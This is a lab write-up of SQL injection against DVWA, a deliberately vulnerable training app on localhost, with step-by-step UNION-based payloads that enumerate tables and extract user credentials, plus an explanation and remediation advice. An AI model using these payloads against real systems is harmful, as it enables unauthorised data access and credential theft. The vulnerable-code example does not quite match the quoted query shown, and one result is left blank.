# DVWA Lab — SQL Injection Vulnerability

## Objective
Exploit SQL Injection vulnerability in DVWA to extract database
information and demonstrate database manipulation.

## Environment
- Target: DVWA running on localhost
- URL: http://localhost/DVWA
- Login: admin / password
- Security Level: Low

## Steps

### 1. Access SQL Injection Module
- Login to DVWA
- Navigate to: Vulnerabilities → SQL Injection

### 2. Test for Vulnerability
Input: `' or '1'='1`
Result: All user records returned — SQL Injection confirmed ✅

### 3. Extract Database Name
Input: `' UNION SELECT database(),2 -- `
Result: Current database name revealed

### 4. Enumerate All Tables
Input: `' UNION SELECT table_name,2 FROM information_schema.tables -- `
Result: List of all database tables displayed

### 5. Extract User Credentials
Input: `' UNION SELECT user,password FROM users -- `
Result:

### 6. Advanced: Dump Database Structure
Input: `' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- `
Result: Column names (id, user, password, first_name, last_name)

## Vulnerability Explanation
The application directly concatenates user input into SQL queries
without using prepared statements or parameterized queries.

Example vulnerable code:
```php
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

Attacker input: `' or '1'='1` becomes:
```sql
SELECT * FROM users WHERE id = '' or '1'='1'
```

Since `'1'='1'` is always true, ALL records are returned.

## Impact
- Unauthorized data access
- Database structure enumeration
- Credential theft
- Potential database deletion or modification
- Full application compromise

## Remediation
- Use prepared statements / parameterized queries
- Input validation and sanitization
- Use ORM frameworks
- Principle of least privilege for DB accounts
- Web Application Firewall (WAF)

## Tools Used
- DVWA
- Web Browser
- MySQL knowledge

## Status
✅ Successfully exploited SQL Injection - Full database access achieved
